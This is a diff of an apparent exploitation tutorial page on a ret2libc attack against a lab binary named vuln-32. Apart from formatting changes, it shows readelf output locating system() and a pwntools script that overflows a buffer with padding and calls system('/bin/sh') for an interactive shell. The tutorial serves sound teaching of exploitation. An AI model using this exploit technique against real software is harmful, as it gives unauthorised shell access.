@@ -33,7 +33,9 @@ $ ldd vuln-32
 
 We need `libc.so.6`, so the base address of libc is `0xf7dc2000`.
 
-> Note: Libc base and the system and /bin/sh offsets may be different for you. This isn't a problem - it just means you have a different libc version. Make sure you use **your** values.
+{% hint style="info" %}
+Libc base and the system and /bin/sh offsets may be different for you. This isn't a problem - it just means you have a different libc version. Make sure you use **your** values.
+{% endhint %}
 
 ### Getting the location of system\(\)
 
@@ -41,6 +43,7 @@ To call system, we obviously need its location in memory. We can use the `readel
 
 ```text
 $ readelf -s /lib32/libc.so.6 | grep system
+
 1534: 00044f00    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0
 ```
 
@@ -128,7 +131,7 @@ libc = elf.libc                        # Simply grab the libc it's running with
 libc.address = 0xf7dc2000              # Set base address
 
 system = libc.sym['system']            # Grab location of system
-binsh = next(libc.search(b'/bin/sh'))  # Search for the string + grab 1st occurence
+binsh = next(libc.search(b'/bin/sh'))  # grab string location
 
 payload = b'A' * 76         # The padding
 payload += p32(system)      # Location of system
@@ -142,5 +145,7 @@ p.interactive()
 
 The 64-bit looks essentially the same.
 
-> Note: Pwntools can simplify it even more with its ROP capabilities, but I won't showcase them here.
+{% hint style="info" %}
+Pwntools can simplify it even more with its ROP capabilities, but I won't showcase them here.
+{% endhint %}
 
